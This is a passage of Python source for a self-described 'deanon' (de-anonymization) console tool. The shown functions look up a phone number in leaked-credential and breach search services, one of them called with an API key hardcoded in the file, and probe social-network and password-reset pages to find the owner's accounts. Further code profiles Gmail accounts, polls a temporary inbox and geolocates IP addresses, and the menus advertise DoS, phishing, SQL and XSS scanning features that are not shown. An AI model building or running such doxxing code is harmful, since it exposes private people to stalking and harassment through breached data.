          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠙⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⠟⣿⣿⣿⣿⡀⠀⠙⠿⣿⣿⣿⣷⣦⣄⣠⣶⣿⣿⣿⡿⠟⠋⠁⣸⣿⣿⣿⡟⢿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⢀⣿⣿⣿⣿⡿⠋⠀⠸⣿⣿⣿⣷⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⢀⣿⣿⣿⣿⠃⠀⠙⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
          ⠀⠀⠀⠀⣼⣿⣿⣿⡟⠁⠀⠀⠀⣿⣿⣿⣿⡁⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⢀⣾⣿⣿⣿⡏⠀⠀⠀⠈⢿⣿⣿⣿⣿⡀⠀⠀⠀
          ⠀⠀⠀⢰⣿⣿⣿⡿⠁⠀⠀⠀⠀⢹⣿⣿⣿⣧⣤⣾⣿⣿⣿⡿⠛⠉⠉⠻⣿⣿⣿⣿⣷⣾⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⡇⠀⠀⠀
          ⠀⠀⠀⣾⣿⣿⣿⠇⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⠀⠀⠀
          ⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⡋⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠈⣿⣿⣿⡆⠀⠀
          ⠀⠀⠠⣿⣿⣿⡇⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣶⣄⡀⠀⣿⣿⣿⡇⠀⠀
          ⠀⠀⠀⣿⣿⣿⣧⣴⣿⣿⣿⣿⣿⠿⠋⠘⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠙⠿⣿⣿⣿⣿⣿⣶⣿⣿⣿⡁⠀⠀
          ⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⢻⣿⣿⣿⣿⠂⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡗⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⡀⠀⠀
          ⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣷⣶⣶⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣤⣤⣤⣽⣿⣿⣿⣿⣿⣿⣦⠀
          ⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
          ⠀⠈⢹⠏⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣧⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠉⠉⠉⣩⣿⣿⣿⠋⡏⢹⠀⠀
          ⠀⠀⠈⠀⠸⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⡆⠀⠀⠀⣼⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⡏⠀⣿⠀⠀⠀
          ⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣟⠀⠀⣸⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡟⠀⠀⠋⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡄⢠⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⢻⣿⣿⣿⣧⣿⣿⣿⣿⡟⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣷⣶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣁⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣿⢹⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             Laitoxx deanon tool! By: Asoru Telegram: @perehodasoru
                               Press to Enter
"""

Anime.Fade(Center.Center(intro), Colors.black_to_red,
           Colorate.Vertical, interval=0.045, enter=True)


def gmail_osint():
    def search_google_account(email_prefix):
        url = f"https://gmail-osint.activetk.jp/{email_prefix}"
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve profile.")
            return None
    email_prefix = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter the email prefix (e.g., for example@gmail.com, enter example): {Color.RESET}")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Searching for Google profile...")
    profile_html = search_google_account(email_prefix)
    if profile_html:
        soup = BeautifulSoup(profile_html, 'html.parser')
        result_div = soup.find(
            'div', style="margin:16px auto;text-align:center;display:block;border:1px solid #000;")
        if result_div:
            content = ''
            for element in result_div.descendants:
                if element.name == 'pre':
                    continue
                if element.string:
                    content += element.string.strip() + '\n'
            lines = content.split('\n')
            formatted_content = f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Google Account data\n\n"
            for line in lines:
                if 'Custom profile picture' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Custom profile picture:\n{lines[lines.index(line) + 1]}\n\n"
                elif 'Last profile edit' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Last profile edit:\n{line.split(': ')[1]}\n\n"
                elif 'Email' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Email:\n{lines[lines.index(line) + 1]}\n\n"
                elif 'Gaia ID' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Gaia ID:\n{line.split(': ')[1]}\n\n"
                elif 'User types' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} User types:\n{lines[lines.index(line) + 1]}\n\n"
                elif 'Profile page' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Google Maps Profile page:\n{lines[lines.index(line) + 1]}\n\n"
                elif 'No public Google Calendar' in line:
                    formatted_content += f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} No public Google Calendar.\n\n"
            print(f"{Color.DARK_RED}{formatted_content.strip()}{Color.RESET}")
        else:
            print(f"{Color.DARK_RED}{profile_html}{Color.RESET}")
    else:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve profile.")


USERSBOX_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkX2F0IjoxNzI1MTk2NzMwLCJhcHBfaWQiOjE3MjUxOTY3MzB9.qG_GQCdZqvUHSHd0yGpnPiUGKo-KRsgNnMo8ZDpRItg"


def search_by_number():
    phone = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Phone number: ")

    def validate_phone(phone):
        try:
            parsed_number = phonenumbers.parse(phone, None)
            return phonenumbers.is_valid_number(parsed_number)
        except phonenumbers.phonenumberutil.NumberParseException:
            return False
    if not validate_phone(phone):
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Invalid number. Try again, only without spaces and with '+'.")
        return
    try:
        parsed_number = phonenumbers.parse(phone, None)
        country = geocoder.description_for_number(parsed_number, "en")
        region = carrier.name_for_number(parsed_number, "en")
        time_zones = timezone.time_zones_for_number(parsed_number)
        number_type = phonenumbers.number_type(parsed_number)
        possible_number = phonenumbers.is_possible_number(parsed_number)
        valid_number = phonenumbers.is_valid_number(parsed_number)
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Mobile number: {phone}")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Country: {country}")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Carrier: {region}")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Timezone: {', '.join(time_zones)}")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Number Type: {number_type}")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Possible Number: {possible_number}")
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Valid Number: {valid_number}")
        if valid_number:
            region_code = phonenumbers.region_code_for_number(parsed_number)
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Region Code: {region_code}")
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} The number is not valid.")
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} [!] - Error fetching data: {e} - [!]")
    try:
        response = requests.get(
            f"https://api.proxynova.com/comb?query={phone[-11:]}&start=0&limit=100", allow_redirects=False)
        response.raise_for_status()
        lines = response.json().get("lines", [])
        for line in lines:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Result: {line}")
    except requests.RequestException:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data from ProxyNova.")
    try:
        response = requests.get("https://api.usersbox.ru/v1/explain", headers={
                                'Authorization': f'Bearer {USERSBOX_API_KEY}'}, params={'q': phone})
        response.raise_for_status()
        items = response.json().get('data', {}).get('items', [])
        for item in items:
            database = item['source']['database']
            collection = item['source']['collection']
            hits_count = item['hits']['count']
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} UserBox DB: {database}, Collection: {collection}, Found: {hits_count}")
    except requests.RequestException:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching data from UserBox.")

    def search_vk_by_phone(phone):
        response = requests.get(f"https://find.vk.com/phone/{phone}")
        if response.status_code == 200:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} VK found!")
            return response
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} VK not found")

    result = search_vk_by_phone(phone)
    if result is not None:
        print(result)
    else:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} User with this phone number not found in VK.")

    url = f'https://www.avito.ru/rossiya/telefony?q={phone}'
    response = requests.head(url)
    if response.status_code == 200:
        print(
            f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Avito found')
    else:
        print(
            f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Avito not found')
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[1{Color.DARK_RED}] TG: t.me/{phone}")
    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[2{Color.DARK_RED}] https://api.whatsapp.com/send/?phone={phone}&text&type=phone_number&app_absent=0 - Whatsapp")
    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[3{Color.DARK_RED}] https://transitapp.com/redirect.html?url=viber://chat?number={phone} - VIBER")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[4{Color.DARK_RED}] https://www.phoneradar.ru/phone/{phone} - Rating")
    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[5{Color.DARK_RED}] https://ok.ru/dk?st.cmd=anonymRecoveryStartPhoneLink - OK account search")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[6{Color.DARK_RED}] https://www.phoneradar.ru/phone/{phone}")
    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[7{Color.DARK_RED}] https://twitter.com/account/begin_password_reset - Twitter account search")
    print(f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[8{Color.DARK_RED}] https://facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar - Facebook account search")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}[9{Color.DARK_RED}] skype:{phone}?call - Call number with Skype")

    def google_search_phone(phone):
        query = f"https://www.google.com/search?q={phone}"
        response = requests.get(query)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            search_results = soup.find_all('a')
            links = []
            for result in search_results:
                href = result.get('href')
                if href.startswith('/url?q='):
                    link = href.replace('/url?q=', '').split('&')[0]
                    links.append(link)
            if len(links) > 0:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Links found:")
                for link in links:
                    print(link)
            else:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Links not found")
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error during request")
    google_search_phone(phone)


def temp_mail():
    def create_temp_mail():
        local_part = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter name: {Color.DARK_RED}")
        domain = "rteet.com"
        email = f"{local_part}@{domain}"
        return email

    def get_mailbox_messages(login, domain):
        response = requests.get(
            f'https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}')
        if response.status_code == 200:
            return response.json()
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve messages.")
            return []

    def get_message_details(login, domain, message_id):
        response = requests.get(
            f'https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={message_id}')
        if response.status_code == 200:
            return response.json()
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Failed to retrieve message details.")
            return None

    def extract_text_from_html(html_content):
        soup = BeautifulSoup(html_content, 'html.parser')
        return soup.get_text()

    def save_message_to_file(filename, sender, date, subject, body):
        with open(filename, 'a', encoding='utf-8') as file:
            file.write(
                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}From: {sender}\n')
            file.write(
                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Date: {date}\n')
            file.write(
                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Subject: {subject}\n')
            file.write(
                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Message: {body}\n\n')

    def adjust_time(date_str):
        date_obj = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
        adjusted_time = date_obj + timedelta(hours=3)
        return adjusted_time.strftime("%Y-%m-%d %H:%M:%S")

    email = create_temp_mail()
    if email:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Temporary email used: {Color.DARK_RED}{email}{Color.RESET}")

        login, domain = email.split('@')
        processed_messages = set()

        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Checking for new messages...")
        while True:
            messages = get_mailbox_messages(login, domain)
            if messages:
                for message in messages:
                    if message['id'] not in processed_messages:
                        message_details = get_message_details(
                            login, domain, message['id'])
                        if message_details:
                            sender = message_details["from"]
                            date = adjust_time(message_details["date"])
                            subject = message_details["subject"]
                            message_body = extract_text_from_html(
                                message_details["body"])
                            save_message_to_file(
                                'emails.txt', sender, date, subject, message_body)

                            print()
                            print(
                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} From: {Color.DARK_RED}{sender}{Color.RESET}")
                            print(
                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Date: {Color.DARK_RED}{date}{Color.RESET}")
                            print(
                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Subject: {Color.DARK_RED}{subject}{Color.RESET}")
                            print(
                                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Message: {Color.DARK_RED}{message_body}\n{Color.RESET}")

                        processed_messages.add(message['id'])
            time.sleep(5)


def check_email_address(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

    if re.match(pattern, email):
        return f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Email address is valid{Color.RESET}"
    else:
        return f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Invalid email address{Color.RESET}"


def get_ip():
    ip = input(
        f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Enter IP: ')

    try:
        ip = socket.gethostbyname(ip)

        infoList1 = requests.get(f"http://ipwho.is/{ip}")
        infoList = infoList1.json()

        if infoList.get("success"):
            print(f'''{Color.DARK_RED}

      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}IP Address:   {infoList["ip"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Success:      {infoList["success"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Type:         {infoList["type"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Continent:    {infoList["continent"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Country:      {infoList["country"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Region:       {infoList["region"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}City:         {infoList["city"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Postal Code:  {infoList["postal"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Capital:      {infoList["capital"]}

''')
        else:
            print(f'''{Color.DARK_RED}

      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}IP:           {infoList["ip"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Success:      {infoList["success"]}
      {Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}Message:      {infoList["message"]}

''')
    except Exception as e:
        print(
            f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED}An error occurred: {e}')


banner2 = f"""{gradient_text(banner_text, current_color_scheme)}                      

                            {Color.DARK_GRAY}Telegram: {Color.DARK_RED}@asoruperehod
                            
                        {Color.DARK_RED}╭──                        ──╮   
                            {Color.DARK_GRAY}[{Color.DARK_RED}21{Color.DARK_GRAY}] {Color.DARK_RED}Find admin panel           
                            {Color.DARK_GRAY}[{Color.DARK_RED}22{Color.DARK_GRAY}] {Color.DARK_RED}Sql scan              
                            {Color.DARK_GRAY}[{Color.DARK_RED}23{Color.DARK_GRAY}] {Color.DARK_RED}Subdomain finder           
                            {Color.DARK_GRAY}[{Color.DARK_RED}24{Color.DARK_GRAY}] {Color.DARK_RED}Ip logger                 
                            {Color.DARK_GRAY}[{Color.DARK_RED}25{Color.DARK_GRAY}] {Color.DARK_RED}Google Osint                
                            {Color.DARK_GRAY}[{Color.DARK_RED}26{Color.DARK_GRAY}] {Color.DARK_RED}Telegram (paketlib)                 
                            {Color.DARK_GRAY}[{Color.DARK_RED}27{Color.DARK_GRAY}] {Color.DARK_RED}Search Nick                   
                            {Color.DARK_GRAY}[{Color.DARK_RED}28{Color.DARK_GRAY}] {Color.DARK_RED}Obfuscate python                    
                            {Color.DARK_GRAY}[{Color.DARK_RED}29{Color.DARK_GRAY}] {Color.DARK_RED}Web-crawler                   
                            {Color.DARK_GRAY}[{Color.DARK_RED}30{Color.DARK_GRAY}] {Color.DARK_RED}Phish Bot(lamer)                                               
                        {Color.DARK_RED}╰──                        ──╯
                                   {Color.DARK_GRAY}[{Color.DARK_RED}<{Color.DARK_GRAY}] {Color.DARK_RED}Back        
                                   """

while True:
    os.system('cls' if os.name == 'nt' else 'clear')

    for _ in range(4):
        print()

    print(f"""{gradient_text(banner_text, current_color_scheme)}                      

                            {Color.DARK_GRAY}Telegram: {Color.DARK_RED}@asoruperehod
                            
        {Color.DARK_RED}╭──                        ──╮   {Color.DARK_RED}╭──                       ──╮
            {Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}] {Color.DARK_RED}Check Phone Number           {Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}] {Color.DARK_RED}Check IP
            {Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}] {Color.DARK_RED}Validate Email               {Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}] {Color.DARK_RED}About the Software
            {Color.DARK_GRAY}[{Color.DARK_RED}5{Color.DARK_GRAY}] {Color.DARK_RED}Support the Author           {Color.DARK_GRAY}[{Color.DARK_RED}6{Color.DARK_GRAY}] {Color.DARK_RED}Info Website
            {Color.DARK_GRAY}[{Color.DARK_RED}8{Color.DARK_GRAY}] {Color.DARK_RED}Strange Text                 {Color.DARK_GRAY}[{Color.DARK_RED}9{Color.DARK_GRAY}] {Color.DARK_RED}Password Generator
            {Color.DARK_GRAY}[{Color.DARK_RED}10{Color.DARK_GRAY}] {Color.DARK_RED}Port Scanner                {Color.DARK_GRAY}[{Color.DARK_RED}11{Color.DARK_GRAY}] {Color.DARK_RED}Temp Mail
            {Color.DARK_GRAY}[{Color.DARK_RED}12{Color.DARK_GRAY}] {Color.DARK_RED}Gmail Osint                 {Color.DARK_GRAY}[{Color.DARK_RED}13{Color.DARK_GRAY}] {Color.DARK_RED}Database search
            {Color.DARK_GRAY}[{Color.DARK_RED}14{Color.DARK_GRAY}] {Color.DARK_RED}Get proxy                   {Color.DARK_GRAY}[{Color.DARK_RED}15{Color.DARK_GRAY}] {Color.DARK_RED}Check site
            {Color.DARK_GRAY}[{Color.DARK_RED}16{Color.DARK_GRAY}] {Color.DARK_RED}Dos attack                  {Color.DARK_GRAY}[{Color.DARK_RED}17{Color.DARK_GRAY}] {Color.DARK_RED}Ip attack  
            {Color.DARK_GRAY}[{Color.DARK_RED}18{Color.DARK_GRAY}] {Color.DARK_RED}Check url                   {Color.DARK_GRAY}[{Color.DARK_RED}19{Color.DARK_GRAY}] {Color.DARK_RED}Xss scan
            {Color.DARK_GRAY}[{Color.DARK_RED}20{Color.DARK_GRAY}] {Color.DARK_RED}Check MAC-address           {Color.DARK_GRAY}[{Color.DARK_RED}66{Color.DARK_GRAY}] {Color.DARK_RED}Exit  
                                                 
        {Color.DARK_RED}╰──                        ──╯   {Color.DARK_RED}╰──                       ──╯     
                                   {Color.DARK_GRAY}[{Color.DARK_RED}>{Color.DARK_GRAY}] {Color.DARK_RED}Next                 
    """)

